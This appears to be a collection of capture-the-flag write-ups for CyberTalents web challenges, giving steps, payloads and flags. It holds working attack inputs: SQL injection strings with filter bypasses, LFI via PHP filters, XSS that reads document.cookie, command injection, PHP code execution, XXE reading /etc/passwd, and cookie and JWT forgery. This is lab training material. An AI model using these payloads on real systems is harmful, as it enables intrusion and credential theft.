@@ -1,0 +1,461 @@
+
+
+Web Practice (https://github.com/prasantadh/ctfs/blob/master/cybertalents/practice_web.md)
+--------------------
+
+
+1. Admin has the power
+--> Challenge: Administrators only has the power to see the flag , can you be one ?
+	just look for source code you will get credentails for user support
+	> user:support password:x34245323 (login with this credentails)
+	> now look for cookies and change role parameter with admin using "edit-this-cookie" extension.
+	> reload and you get the flag
+
+> hiadminyouhavethepower
+
+
+
+2. This Is Sparta
+
+--> Challenge: Morning has broken today they're fighting in the shade when arrows blocked the sun they fell tonight they dine in hell
+	just look for source code for page you will get js - just beutify js properly
+
+	function check() {
+    var _0xeb80x2 = document['getElementById']('user')['value'];
+    var _0xeb80x3 = document['getElementById']('pass')['value'];
+    if (_0xeb80x2 == 'Cyber-Talent' && _0xeb80x3 == 'Cyber-Talent') {
+        alert('                      Congratz \x0A\x0A');
+    } else {
+        alert('wrong Password');
+    }
+}
+
+	> understanding code will let you understand that if both user and pass is Cyber-Talent you will get access
+	  so here is your flag
+
+>  {J4V4_Scr1Pt_1S_Aw3s0me}
+
+
+
+3. share your ideas
+
+--> can you reveal the admin password ?
+
+	login into web application after registeration > enter '(single-quote) in text-feild and submit on Share.
+	> you get error Error : HY000 1 unrecognized token: "''')"    < means there is SQLite Injection
+
+	> use this payload >> (so you can see working perfectly)
+
+		hello' || (select sqlite_version()));--
+
+	> lets see all tables from sql >> (now we got there is 1 table with four 5 columns)
+
+		hello' || (SELECT sql FROM sqlite_master));--
+
+	> now lets look for entires in table for users having role=admin
+
+		hello' || (select password from xde43_users where role="admin"));--
+
+	now here you get the flag
+
+> flag245698
+
+
+4. Dark Project
+--> What kind of Project are you seeking for ?
+	here the goal is look for about,project,contacts >
+	but the issue is the navigation form backend is commented in source code you can see.
+
+	<!--
+<nav class="navbar navbar-inverse">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="#"> <font size=10 color="white">&#9775;</font> </a>
+    </div>
+    <div class="collapse navbar-collapse" id="myNavbar">
+      <ul class="nav navbar-nav">
+        <li class="active"><a href="index.php">Home</a></li>
+        <li><a href="index.php?home=about">About</a></li>
+        <li><a href="index.php?home=projects">Projects</a></li>
+        <li><a href="index.php?home=contact">Contact</a></li>
+      </ul>
+      <ul class="nav navbar-nav navbar-right">
+        <li><a href="#"><span class="glyphicon glyphicon-log-in"></span> Login</a></li>
+      </ul>
+    </div>
+  </div>
+</nav>
+-->
+
+	so now here we need to perform LFI to access file .
+	> again we failed index.php?home=/etc/passwd and index.php?home=/etc/passwd%00 both now working
+	> index.php?home=../about not working lets use php filters
+
+	> index.php?home=php://filter/read=convert.base64-encode/resource=about
+	(tired with about,project,contact) finally index worked
+
+	> index.php?home=php://filter/read=convert.base64-encode/resource=index
+
+	now you get base64-encode string lets decode and you get the flag
+
+> {pHp_Wr4P3rs_4r3_Us3fuL}
+
+
+
+
+5. Join Team
+--> Flag safe in the server environment , can you reveal it.
+	When i tried to access it was showing error "BAD Gateway"
+
+
+6. Iam Legend
+--> If I am a legend, then why am I so lonely?
+	a)here when we see login but before that lets check source code
+	now we can see a huge JS code encoded i.e You'll find a script that is obfuscated in a weird format
+	doing some research, I found that it was obfuscated using an encoding called jsfuck
+
+	b)To decode there is no mechanism so we can use pioson.js to decode obfuscated code
+	but i failed here
+
+(user=="Cyber" && pass=="Talent")
+
+
+> {J4V4_Scr1Pt_1S_S0_D4MN_FUN}
+
+7. Weird Blog
+--> Das Kinda weird Just Do it
+
+	Reference:- https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/
+				https://ctftime.org/writeup/10374
+
+	Here it has advance filter for SQL injecton so lets bypass it
+    (here we make combination of both capital and small chars for query to bypass)
+
+--> hello'UniOn(seleCt(1))#
+
+	you can see 1 is getting reflected back so we can say that > only one column is there
+
+--> hello'uNion(sElect(taBle_name)from(infOrmation_schema.tables))#
+
+	That payload returned CHARACTER_SETS. With that table name we can start creating range queries,
+	first a one sided one:
+
+--> hello'uNion(sElect(tabLe_name)from(infOrmation_schema.tables)having((taBle_Name)>('CHARACTER_SETS')))#
+
+	That returned COLLATIONS and with that name we can create a two sided range query
+	to get a table in between them if exists:
+
+--> hello'uNion(sElect(tAble_name)from(infOrmation_schema.tables)having((table_Name)<('CHARACTER_SETS')&&(table_Name)>('COLLATIONS')))#
+
+	With that enumeration process we get the suspiciously named FL@g table.
+
+--> hello'uNion(sElect(t.cOlumn_name)from(sElect(cOlumn_name),(table_namE)from(infOrmation_schema.COLUMNS)having(table_namE)=('FL@g'))t)#
+	That's usually trivial but in this case the table name contained a special charchter - at sign(@), which should be escaped with backticks(`):
+
+--> hello'uNion(sElect(`FL@g`)from(`FL@g`))#
+	and here you get the flag
+
+
+> {Th3_W31rd3sT_BL0G_3V3r}
+
+
+8. Cool Name Effect
+
+--> Webmaster developed a simple script to do cool effects on your name, but his code not filtering the inputs correctly execute javascript alert and prove it.
+	this is simple XSS Challenge wher script tag is blocked
+	now use > <img src=x onerror=alert(1)>  and here you get the flag
+
+> ciyypjz
+
+
+9. The Restricted Sessio
+
+--> Flag is restricted to logged users only , can you be one of them.
+	a) look for source code you can see you need to set something PHPSESSID=test as cookie. but you an response as Session not found in data/session_store.txt
+	b) vist data/session_store.txt to get sessionID for PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23 and now you get response as to give UserInfo as username > lets give UserInfo=temp
+	c) but you get again error as Validation failed, lets look again for source code and visit "getcurrentuserinfo.php"
+	   but again you wont get the username so sent same request using POST method and PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23  parmater as body.
+	d) here you get user name as : john now set cookie:PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23;UserInfo=john as GET on home page and here you get the flag
+
+
+> sessionareawesomebutifitsecure
+
+
+10. Encrypted Database
+
+--> The company hired an inexperienced developer, but he told them he hided the database and have it encrypted so the website is totally secure, can you prove that he is wrong ??
+	It was all about looking for source code.
+	http://104.199.66.117/encrypted-database/secret-admin/hidden-database/db.json and here you get the flag
+
+	{"flag":"ab003765f3424bf8e2c8d1d69762d72c"}  find its value of md5 and you get badboy
+
+> badboy
+
+
+11. Newsletter
+
+--> the administrator put the backup file in the same root folder as the application, help us download this backup by retrieving the backup file name
+
+	there is command injection in thi Challenge
+	> akash`whoami`&&@gmail.com  			and here you get your command executed now just list out you get the backup file.
+	> the name of backup file is "hgdr64.backup.tar.gz" and it is only the flag
+
+
+> hgdr64.backup.tar.gz
+
+
+12. Searching for the cookie
+
+--> simple search website we need to know which cookie to eat ;)
+
+	when it comes about search for eating cookie then there is XSS, so lets exploit
+	-> </script><script>alert(1)</script>  (looking at source code this payload works) -- but you wont get flag
+	so here you need to execute "document.cookie"
+	-> </script><script>alert(document.cookie)</script>  and here you get the flag
+
+> coolcookie112
+
+
+13. Wrong token
+
+--> Request to the flag is forbidden due to wrong csrf token ... can you fix it and reveal the flag
+
+	a) here look for source code and intercept it in burpsuite > Repeater > change request to POST
+	> once done with that after looking into the source code we can say that we need to set header for Content-Type
+	i.e content-Type: application/json and body as data i.e {"action":"view_flag","_token":"asdjhDJhfkjdI"}
+
+	b) but now you get an error saying Failed Comparison ( incoming CSRF token != Session CSRF token )
+	> all you need to do is to make statement true so send data as -> {"action":"view_flag","_token":true}
+
+
+> dkjfhsdkhfr43r34r3
+
+
+14.  who is admin
+
+--> Your mission is to know who's the admin running this website by knowing his email.
+
+	When I was trying to solve this Challenge it was not working there was some issue in backed given me this error
+	Exception : SQLSTATE[HY000] [14] unable to open database file
+
+
+
+15. who am i?
+
+--> Do not Start a fight you can not stop it
+
+	1. here when you look for source code you get that there is credentails available for Guest user just login
+	now you see you dont have access of admin > lets look for cookie you can see Authentication cookie is set with some base64 value lets
+	decode it bG9naW49R3Vlc3Q == login=Guest
+	2. now make it login=admin  and encode with base64 bG9naW49YWRtaW4= and need to set it as Authentication cookie here you get access to admin account.
+
+
+> Flag{B@D_4uTh1Nt1C4Ti0n}
+
+16. catch me if you can
+
+--> I'm Just wanna Make Sure if you Are Mr.Robot
+
+	1. here looking to complete source code and analysis of it does not really give you anything
+	> go to /robots.txt > here you get two path with  >> /source.php & /S3cr3t.php
+
+	2. so lets look for source code try to enter the valid password to to authorised access.
+
+	3. intercept the request in browser and now look for pass= parmeter and try to send encoded charchter
+	   eg : R_4r3%40  > but it does not work so make it regrex with new line
+	   eg : 12312%0aR_4r3%40  dont forget to give some random value before new line else it will not work
+
+	4. look into burpsuite you will get that there is code saying Can You Read This For Me ?
+
+	<br><br>-[------->+<]>---.++++++.------------.--[--->+<]>---.[----->+<]>.[--->++<]>.>-[----->+<]>.>-[--->+<]>--.[--->+<]>+++.--.--[->+++++<]>+.---[-->+++<]>--.+[----->+<]>.++[++>---<]>.+[->++<]>.-----.+[--->++<]>+.--[----->+<]>-.>-[----->+<]>.+.>--[-->+++<]>.
+
+	ohhh yeah so its BRAIN fuck language lets decode execute it using https://www.dcode.fr/brainfuck-language or https://www.splitbrain.org/_static/ook/
+	and here you get the flag in console
+
+> FL@g{R3Str1Ct1d_Ar34}
+
+17. Black Inc.
+
+--> Black Inc is a file sharing website, however the file uploads was disabled by an administrator, can you change that or find a bypass?
+
+	> here after a lot of try got to know we need to do CSRF attack
+	create a html file with following code
+
+	<form action="http://35.240.62.111/black_inc/index.php" method="POST" enctype="multipart/form-data">
+		<input type="file" name="anyname">
+		<input type="submit">
+	</form>
+
+	then open it in browser > choose any file and > submit here you the flag.
+
+> 6b768890756adf11a9b6bc3c0f816129
+
+
+
+18. Blue Inc.
+
+--> Blue Inc is a new social media website that's still under construction, However it doesn't have registration yet, but if you are interested in seeing our website then you can login with demo/demo.
+
+	this was easist one here all you need to do is to login with demo/demo > now look for cookes replace > user:admin
+	and in url make ?user=admin and reload and here you get the flag
+
+> 15716a249064f7e9684a816dcdb05282
+
+19. String Highlighter
+
+--> Flag is hidden somewhere in the directory
+
+	There is PHP code execution that text filed- try the following payload
+
+	<?php
+	$out =`ls -al`;
+	echo "<pre>$out</pre>";
+	?>
+
+	and here after some seach we got the flag
+
+	<?php
+	$out =`cat qwerthdsaa/flag`;
+	echo "<pre>$out</pre>";
+	?>
+
+
+> kshd125fddw
+
+
+
+20. Owls Blog
+
+--> Owls are winking at you. Try to get the flag
+	Here there is SQL injection so we need to understand how things actually work were we are going to add new
+	line using url encoding %0a and alss single-quote (') as %27 and below is payload which works
+
+	> search=test%0a%27 union select flag from flag #
+
+
+> Flag{R3G3X_Ar3_N0T_G00D_For_OW3ls}
+
+
+21. Big Number
+
+--> a big number is needed to save the world
+	> as we can see the souce code but there is no way to pass an value, but we must remember PHP also accepts hex value
+	so give input 3E8 which is equals to 1000 and here you get the flag.
+
+> FLAG{Yes_Y0u_C4n_Use_Exp0nentiaL}
+
+
+
+22. bypass the world
+
+--> I Don't Care if the world is against you, but i believe that you can bypass the world
+
+
+
+23. Book Lover
+
+--> share your love for books and search for the flag inside the source code.
+
+	this was awesome challenege it was about XXE where it is very simple but need to try harder as i did.
+	> upload a XML file > before that attach an XML file containing following payload,
+
+	<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+	<reset><user>admin	&xxe;</user><pass>admin</pass></reset>
+
+	here you get passwd file, now the goal is to get the flag, tried lots of things did research and got to know we can use php wrapper
+
+	and here the payload be the following
+
+	<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+	<reset><user>admin	&xxe;</user><pass>admin</pass></reset>
+
+
+	decode the base64 output and here you get the flag when you check it.
+
+> xeeflag345
+
+
+24. admin gate first
+
+--> Flag is safe in the admin account info
+
+
+	a) steps to follow is important in this challenge
+	   enter any name and login into application Jawt
+	b) look for cookies and and just decode the JWT (JSON WEB ACCESS TOKEN) using jwt.into
+	c) now you got to know we need to replace the username with admin name and
+	   we need signiture key to make a valid token of admin
+	d) we use john tool for that we first need to convert JWT token so that we can use it in john tool
+	   > download git clone https://github.com/Sjord/jwtcrack
+	e) fire $ python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcInRlc3RcIixcInJvbGVcIjpcInVzZXJcIn0ifQ.XSPy0jZd8CEtHl2e3C1SjPaewco1tjO3iajbkJy2OFQ > jwt.john
+
+	f) $john --show jwt.john
+
+	e) you get signiture key as "123456"
+	f) encode "admin" jwt with "123456" signiture and use it as cookie for JWT and you get flag
+
+> J!W!T#S3cr3T@2018
+
+
+
+25. screenshot
+
+--> Developer is generating screenshots using internal api servers , flag is the front server hostname (not the api hostname) , can you extract it ??"
+
+	to look for screenshots you can visit the source. but here the internal API's are not working, for this challenege we will again going to use
+	php wrapper for making request to internal server.
+
+	php://filter/convert.base64-encode/resource=internalapi1.local/../index.php
+
+	a) /screenshot/?url=&server=php://filter/convert.base64-encode/resource=internalapi1.local/../index.php
+	b) download that image from source code the URL can be taken.
+	c) now once image is downloaded change its extension from .jpg to .txt and open it you will get base64 code
+	d) decode it you will get index.php source code.
+	e) and here you get the flag.
+
+> Server!Host@Flag
+
+
+26. Inbox
+
+--> The developer emailed the flag to the admin , can you get it.
+
+	here there is SQL injection available in this inbox application. when you see the source code you will get to know
+	the code is revealing the show.php with id parameter, other option is to intercept the request in burpsuite and click on email "HOLA" here
+	you will get a post request containing post id now replace it with SQLi payload. here they are using SQlite
+
+
+	POST /inbox/show.php HTTP/1.1
+
+	id=(select id from sqlite_master where title="flag")
+
+
+> KHDFI3#fi4@Flag
+
+
+
+27. Back to basics
+
+--> not pretty much many options. No need to open a link from a browser, there is always a different way
+
+	a)here when you open the link in browser it will get redirected to google.com
+	b)but now intercept the request in burpsuite you will get to know if you send GET request using Repeater
+	you will get a response as following 200K
+
+	<script> document.location = "http://www.google.com"; </script>
+
+	c) now lets change the Request in POST
+	POST /backtobasics/ HTTP/1.1
+
+	here you get JS code that too is commented, lets break it.
+
+	<!--
+var _0x7f88=["","join","reverse","split","log","ceab068d9522dc567177de8009f323b2"];function reverse(_0xa6e5x2){flag= _0xa6e5x2[_0x7f88[3]](_0x7f88[0])[_0x7f88[2]]()[_0x7f88[1]](_0x7f88[0])}console[_0x7f88[4]]= reverse;console[_0x7f88[4]](_0x7f88[5])
+-->
